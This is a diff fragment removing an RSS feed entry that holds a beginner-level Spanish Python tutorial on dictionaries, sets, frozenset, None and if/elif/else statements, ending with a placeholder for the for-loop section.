-    &quot;clave1&quot;: &quot;valor1&quot;,
-    &quot;clave2&quot;: &quot;valor2&quot;
-}
-
-diccionario2 = {
-    &quot;clave3&quot;: &quot;valor3&quot;,
-    &quot;clave4&quot;: &quot;valor4&quot;
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Podemos aplicar algunos operaciones como las de &lt;code&gt;identidad&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;diccionario1 is diccionario2
-
-False
-
-diccionario1 == diccionario2
-
-False
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Pero en el caso de operadores &lt;code&gt;aritmeticos&lt;/code&gt;, estos no podemos usarlos ya que nos da un error.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;diccionario1 + diccionario2
-
----------------------------------------------------------------------------
-TypeError                                 Traceback (most recent call last)
-&amp;lt;ipython-input-51-9a6dceb2d25d&amp;gt; in &amp;lt;module&amp;gt;
-----&amp;gt; 1 diccionario1 + diccionario2
-
-TypeError: unsupported operand type(s) for +: 'dict' and 'dict'
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;sets&quot;&gt;Sets &lt;a href=&quot;#sets&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Los sets son un tipo de datos que nos permite almacenar múltiples elementos en una misma variable. A diferencia de las listas, la colección de elementos que forman un set:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;No se pueden indexar&lt;/li&gt;
-  &lt;li&gt;No respetan un orden&lt;/li&gt;
-  &lt;li&gt;No pueden contener valores duplicados&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Los &lt;code&gt;sets&lt;/code&gt; se representan con el tipo de dato &lt;code&gt;set&lt;/code&gt;. La sintaxis que se utiliza para definir un set en &lt;code&gt;Python&lt;/code&gt; es: {valor1, valor2, …, valorn}.&lt;/p&gt;
-
-&lt;p&gt;Vamos a definir un &lt;code&gt;set&lt;/code&gt; a continuación para poder entenderlo de una mejor manera.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lenguajes = {&quot;python&quot;, &quot;rust&quot;, &quot;javascript&quot;}
-
-print(lenguajes)
-
-{'python', 'rust', 'javascript'}
-
-type(lenguajes)
-
-set
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&quot;funcionamiento-de-un-set&quot;&gt;Funcionamiento de un set &lt;a href=&quot;#funcionamiento-de-un-set&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
-
-&lt;p&gt;Debido a sus caracteristicas, suele utilizarse para casos de uso muy específicos, como eliminar elementos duplicados de una lista o implementar algunas operaciones matemáticas como la intersección de dos conjuntos.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lenguajes = {&quot;python&quot;, &quot;rust&quot;, &quot;javascript&quot;}
-
-miset[0]
-
----------------------------------------------------------------------------
-TypeError                                 Traceback (most recent call last)
-&amp;lt;ipython-input-7-97dccbd19ab1&amp;gt; in &amp;lt;module&amp;gt;
-      1 # Los elementos de un set no se pueden indexar
-----&amp;gt; 2 lenguajes[0]
-
-TypeError: 'set' object is not subscriptable
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Como observamos si tratamos de indexar, no nos es posible. La pregunta seria entonces si no podemos ingresar a sus elementos para que nos sirve?.&lt;/p&gt;
-
-&lt;p&gt;Pues una de ellas seria que si tenemos la necesidad de eliminar elementos repetidos de una &lt;code&gt;lista&lt;/code&gt; que en muchos casos nos va a pasar, podemos hacerlo haciendo uso de la función &lt;code&gt;set()&lt;/code&gt; y con ella quitamos todos los elementos duplicados.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lenguajes = [&quot;python&quot;, &quot;rust&quot;, &quot;javascript&quot;, &quot;python&quot;, &quot;php&quot;, &quot;nodejs&quot;, &quot;javascript&quot;, &quot;python&quot;, &quot;C&quot;, &quot;php&quot;]
-
-set(lenguajes)
-
-{'python', 'rust', 'javascript', 'php', 'nodejs', 'C'}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ahora podemos ver que tenemos que eliminamos los elementos repetidos, pero ahora diras, perfecto se elimino pero ahora tengo un &lt;code&gt;set&lt;/code&gt; y yo quiero una &lt;code&gt;lista&lt;/code&gt;. Pues podemos utilizar el mismo concepto para convertir el resultado de nuestro &lt;code&gt;set&lt;/code&gt; a una lista, haciendo uso de la función &lt;code&gt;list&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lenguajes = [&quot;python&quot;, &quot;rust&quot;, &quot;javascript&quot;, &quot;python&quot;, &quot;php&quot;, &quot;nodejs&quot;, &quot;javascript&quot;, &quot;python&quot;, &quot;C&quot;, &quot;php&quot;]
-
-lenguajesUnicos = list(set(lenguajes))
-
-print(lenguajesUnicos)
-
-['python', 'rust', 'javascript', 'php', 'nodejs', 'C']
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&quot;frozenset&quot;&gt;Frozenset &lt;a href=&quot;#frozentset&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
-
-&lt;p&gt;Es igual que un &lt;code&gt;set&lt;/code&gt;, pero con la diferencia de que este es inmutable. No es un tipo de dato relevante, pero no esta de mas mencionarlo.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;frozset = frozenset({&quot;python, php, javascript&quot;})
-
-print(frozset)
-
-frozenset({'python, php, javascript'})
-
-type(frozset)
-
-frozenset
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;nonetype&quot;&gt;NoneType &lt;a href=&quot;#nonetype&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;La palabra clave &lt;code&gt;None&lt;/code&gt; es un objeto de la clase &lt;code&gt;NoneType&lt;/code&gt; que se utiliza para definir una variable nula o un objeto vacío.&lt;/p&gt;
-
-&lt;p&gt;Podemos asignar &lt;code&gt;None&lt;/code&gt; a cualquier variable, pero no se podemos crear objetos &lt;code&gt;NoneType&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;variable = None
-
-print(variable)
-
-None
-
-type(None)
-
-NoneType
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Usamos este tipo de dato cuando no queremos retornar nada o cuando tenemos una variable a la que no asignesmos ningun valor, nos encontraremos muchas vences con este tipo de dato.&lt;/p&gt;
-
-&lt;h3 id=&quot;funcionamiento&quot;&gt;Funcionamiento &lt;a href=&quot;#funcionamiento&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
-
-&lt;p&gt;Debemos tener en cuanto algunas cosas importantes sobre &lt;code&gt;None&lt;/code&gt;, las cuales son:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;None no es igual que False&lt;/li&gt;
-  &lt;li&gt;None no es 0&lt;/li&gt;
-  &lt;li&gt;None no es un string vacío&lt;/li&gt;
-  &lt;li&gt;Cuando comparamos None con cualquier cosa devuelve False excepto con None&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;variable = None
-
-variable is None
-
-True
-
-variable == None
-
-True
-
-variable is False
-
-False
-
-variable is True
-
-False
-
-variable == False
-
-False
-
-variable == 0
-
-False
-
-variable == &quot;&quot;
-
-False
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Como podemos ver si comparamos el &lt;code&gt;None&lt;/code&gt; con cero o una cadena vacia nos devuelve &lt;code&gt;False&lt;/code&gt;, puesto que no es lo mismo y de igual manera si comparamos con cualquier otra cosa nos devolvera &lt;code&gt;False&lt;/code&gt;. El unico caso en el que nos devuelve &lt;code&gt;True&lt;/code&gt; es cuando lo comparamos con el propio &lt;code&gt;None&lt;/code&gt;.&lt;/p&gt;
-
-&lt;h2 id=&quot;estructuras-de-control-de-flujo&quot;&gt;Estructuras de Control de Flujo &lt;a href=&quot;#estructuras-de-control-de-flujo&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Todo lo que hemos visto hasta el momento han sido elementos que se ejecutan de manera secuencial y en el orden especificado.&lt;/p&gt;
-
-&lt;p&gt;Sin embargo, cuando estamos programando con frecuencia se necesita cambiar el control del flujo de ejecución de las sentencias y realizar acciones como: saltarse alguna sentencia, ejecutar una serie de sentencias muchas veces repetidamente, o elegir entre conjuntos alternativos de sentencias a ejecutar.&lt;/p&gt;
-
-&lt;p&gt;Justo aqui es donde entran en juego las estructuras de control de flujo, ya que nos permiten modificar el flujo de ejecución de un programa.&lt;/p&gt;
-
-&lt;h2 id=&quot;sentencia-if-elif-y-else--sentencia-if-elif-y-else&quot;&gt;Sentencia If, elif y else &lt;a href=&quot;#sentencia-if,-elif-y-else&quot;&gt;#&lt;/a&gt; {#sentencia-if,-elif-y-else}&lt;/h2&gt;
-
-&lt;h2 id=&quot;sentencia-if&quot;&gt;Sentencia If &lt;a href=&quot;#sentencia-if&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;La sentencia &lt;code&gt;if&lt;/code&gt; es una de las estructuras más importantes de cualquier lenguaje de programación.&lt;/p&gt;
-
-&lt;p&gt;Esta estructura nos permite implementar sentencias condicionales dentro de nuestro programa.&lt;/p&gt;
-
-&lt;p&gt;La sintaxis utilizada para definir la sentencia &lt;code&gt;if&lt;/code&gt; es la siguiente:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;if expresión:
-    sentencia(s)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;expresión: Se evalua en un contexto booleano, cuyo resultado debe devolver &lt;code&gt;True o False&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;sentencia(s): Es el bloque de sentencias que se ejecutarán cuando el resultado de evaluar la expresión sea &lt;code&gt;True&lt;/code&gt;, en caso contrario se omite.&lt;/p&gt;
-
-&lt;p&gt;Veamos a continuación un caso practico para entenderlo mejor.&lt;/p&gt;
-
-&lt;p&gt;Primero definamos dos variables y les asignaremos valores numericos.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;numero1 = 5
-
-numero2 = 10
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Seguidamente vamos a definir una expresión que en este caso al cumplirse nos devolvera &lt;code&gt;True&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;numero1 &amp;lt; numero2
-
-True
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Ahora vamos a usar la sentencia &lt;code&gt;if&lt;/code&gt; con la expresión antes creada. Donde al cumplirse la expresión nos imprima por pantalla dos cadenas de texto.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;if numero1 &amp;lt; numero2:
-
-    print(&quot;Primera sentencia&quot;)
-
-    print(&quot;Segunda sentencia&quot;)
-
-Primera sentencia
-Segunda sentencia
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Efectivamente ya que el &lt;code&gt;numero1&lt;/code&gt; es mayor al &lt;code&gt;numero2&lt;/code&gt;, nos valida como &lt;code&gt;True&lt;/code&gt; la condición y nos mostrara las cadenas en pantalla.&lt;/p&gt;
-
-&lt;p&gt;Pero si ahora modificamos el valor de la variable &lt;code&gt;numero1&lt;/code&gt; y volvemos a validar la expresión usando la sentencia &lt;code&gt;if&lt;/code&gt;, no nos imprimira las cadenas puesto que ahora la condición no se cumple.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;numero1 = 15
-
-if numero1 &amp;lt; numero2:
-
-     print(&quot;Primera sentencia&quot;)
-
-    print(&quot;Segunda sentencia&quot;)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Algo muy importante! es que en Python todo el codigo que sea local a una estructura,ya sea una función o una estructura de control como &lt;code&gt;if&lt;/code&gt;, debe esta “identado”, es decir, respetar la sangría.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Una de las cosas super interesantes de esta sentencia de control de flujo es que podemos utilizar casi cualquier tipo de operador, tipo de dato y expresión siempre y cuando el resultado sea un valor booleano &lt;code&gt;True o False&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;En este caso usaremos una lista para ejecutar la sentencia.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;listaAlumnos = [&quot;juan&quot;, &quot;pablo&quot;, &quot;lucas&quot;]
-
-if &quot;juan&quot; in listaAlumnos:
-
-    print(&quot;El alumno se encuentra en la lista&quot;)
-
-El alumno se encuentra en la lista
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Podriamos hacer lo mismo, pero esta vez a partir de una &lt;code&gt;tupla&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;Numeros = (1, 2, 4, 5, 6, 7, 8)
-
-if 4 in Numeros:
-
-    print(&quot;El numero se encuentra en la tupla&quot;)
-
-El numero se encuentra en la tupla
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;clausula-else&quot;&gt;Clausula Else &lt;a href=&quot;#clausula-else&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Hay ocasiones donde nos encontraremos con casos en los que quedremos que una estructura ejecute unas sentencias si la expresión es &lt;code&gt;True&lt;/code&gt; pero además, que ejecute otras sentencias distintas si la expresión es &lt;code&gt;False&lt;/code&gt;. Para este tipo de casos se utiliza la cláusula &lt;code&gt;else&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;La sintaxis que debemos utilizar es la siguiente:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;if &amp;lt;expresión&amp;gt;:
-    &amp;lt;sentencia(s)&amp;gt;
-else:
-    &amp;lt;sentencia(s)&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;A continuación vamos a mostrarlo en un ejemplo:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;numero1 = 4
-
-numero2 = 8
-
-if numero1 &amp;lt; numero2:
-
-    print(&quot;Ejecuta la sentencia si es True&quot;)
-
-else:
-
-    print(&quot;Ejecuta la sentencia si es False&quot;)
-
-Ejecuta la sentencia si es True
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Como vemos al cumplirse la condición, nos imprime el print dentro del &lt;code&gt;if&lt;/code&gt;, pero si ahora modificamos la condición en sentido contrario, esta al no cumplirse nos devolvera un &lt;code&gt;False&lt;/code&gt; y por lo tanto se ejecutara la condición definida en el &lt;code&gt;else&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;numero1 = 4
-
-numero2 = 8
-
-if numero1 &amp;gt; numero2:
-
-    print(&quot;Ejecuta la sentencia si es True&quot;)
-
-else:
-
-    print(&quot;Ejecuta la sentencia si es False&quot;)
-
-Ejecuta la sentencia si es False
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;clausula-elif&quot;&gt;Clausula Elif &lt;a href=&quot;#clausula-elif&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Ahora que pasaria si queremos implementar una estructura condicional que requiera múltiples evaluaciones de varias expresiones para tomar la decisión de qué código ejecutar. Para estos casos específicos podemos utilizar la cláusula &lt;code&gt;elif&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;La sintaxis que debemos utilizar para definir la cláusula &lt;code&gt;elif&lt;/code&gt; dentro de una estructura &lt;code&gt;if&lt;/code&gt; es esta:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;if &amp;lt;expresión&amp;gt;:
-    &amp;lt;sentencia(s)&amp;gt;
-elif &amp;lt;expresión&amp;gt;:
-    &amp;lt;sentencia(s)&amp;gt;
-elif &amp;lt;expresión&amp;gt;:
-    &amp;lt;sentencia(s)
-...
-else:
-    &amp;lt;sentencia(s)&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Veamos en un caso practico a continuación.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;alumnos = [&quot;Peter&quot;, &quot;Pablo&quot;, &quot;Juan&quot;, &quot;Scarlet&quot;]
-
-if &quot;Pedro&quot; in alumnos:
-
-    print(&quot;Hola alumno Pedro&quot;)
-
-elif &quot;Nicolas&quot; in alumnos:
-
-    print(&quot;Hola alumno Nicolas&quot;)
-
-elif &quot;Maria&quot; in alumnos:
-
-    print(&quot;Hola alumna Maria&quot;)
-
-elif &quot;Scarlet&quot; in alumnos:
-
-    print(&quot;Hola Scarlet&quot;)
-
-else:
-
-    print(&quot;El alumno no se encuentra en la lista&quot;)
-
-Hola Scarlet
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Como vemos en nuestro programa, definimos una lista de alumnos y realizamos multiples evaluaciones con el uso de &lt;code&gt;elif&lt;/code&gt;, de modo que el programa recorrera cada una de estas hasta que alguna se cumpla y nos devolvera el resultado de validar esa condición.&lt;/p&gt;
-
-&lt;h2 id=&quot;sentencia-if-en-una-linea&quot;&gt;Sentencia if en una linea &lt;a href=&quot;#sentencia-if-en-una-linea&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Python nos permite utilizar una sintaxis específica para implementar sentencias &lt;code&gt;if&lt;/code&gt; en una sola línea de código. Sin embargo, el uso de esta opción no es tan recomendable debido a que puede aumentar la complejidad en la lectura del código.&lt;/p&gt;
-
-&lt;p&gt;Para ello solo debemos establecer una condición y seguidamente debemos separar cada sentencia que queremos ejecutar con &lt;code&gt;;&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;if 20 &amp;gt; 10: print(&quot;Primera sentencia&quot;);print(&quot;Segunda sentencia&quot;)
-
-Primera sentencia 
-Segunda sentencia
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;operador-condicional&quot;&gt;Operador Condicional &lt;a href=&quot;#operador-condicional&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Python tambien soporta una construcción más relacionada con la sentencia &lt;code&gt;if&lt;/code&gt; que puede resultarnos muy interesante para determinados casos. A esta construcción se le denomina operador condicional.&lt;/p&gt;
-
-&lt;p&gt;La sintaxis es la siguiente:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;&amp;lt;expresión1&amp;gt; if &amp;lt;expresión_condicional&amp;gt; else &amp;lt;expresión2&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Esto nos permite simplificar el código que utilizamos para determinadas tareas como, asignar un valor a una variable en función de una condición o imprimir valores por pantalla.&lt;/p&gt;
-
-&lt;p&gt;Viendolo de manera practica.&lt;/p&gt;
-
-&lt;p&gt;Supongamos queremos asignar un valor en función al nombre que nos de el usuario, para ello podriamos crear un codigo que nos lo realize pero este tendria varias lineas.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;nombre = &quot;Juan&quot;
-
-if nombre == &quot;Juan&quot;:
-  edad = 18
-else:
-  edad = 10
-
-print(edad)
-
-18
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Pero si usamos el &lt;code&gt;operador condicional&lt;/code&gt;, podriamos simplificar todas esas lineas de codigo y ejecutarla en una sola.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;nombre = &quot;Juan&quot;
-
-edad = 18 if nombre == &quot;Juan&quot; else 10
-
-print(edad)
-
-18
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Como vemos en ambos casos obtenemos el mismo resultado, pero haciendo uso de este operador optimizamos nuestro codigo de tal modo que podemos simplicarlo, y esto nos resulta muy conveniente.&lt;/p&gt;
-
-&lt;p&gt;De la misma manera podemos usar este operador para en vez de asignar, mostrar resultados por pantalla.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;dia=&quot;sabado&quot;
-
-print(&quot;Voy a estudiar python&quot; if dia==&quot;sabado&quot; else &quot;tengo que trabajar&quot;)
-
-Voy a estudiar python
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Esto es muy genial, ya que podemos tener mas simplificado y elegante nuestro codigo, y es bastante utilizado.&lt;/p&gt;
-
-&lt;h2 id=&quot;sentencia-for&quot;&gt;Sentencia For &lt;a href=&quot;#sentencia-for&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;En la proxima actualización…. 😄&lt;/p&gt;
-</description>
-        <pubDate>Thu, 30 Mar 2023 00:00:00 +0000</pubDate>
-        <link>http://localhost:4000/articulos/Python3</link>
-        <guid isPermaLink="true">http://localhost:4000/articulos/Python3</guid>
-        
-        <category>Python3</category>
-        
-        <category>programación</category>
-        
-        
-        <category>articulos</category>
         
       </item>
     
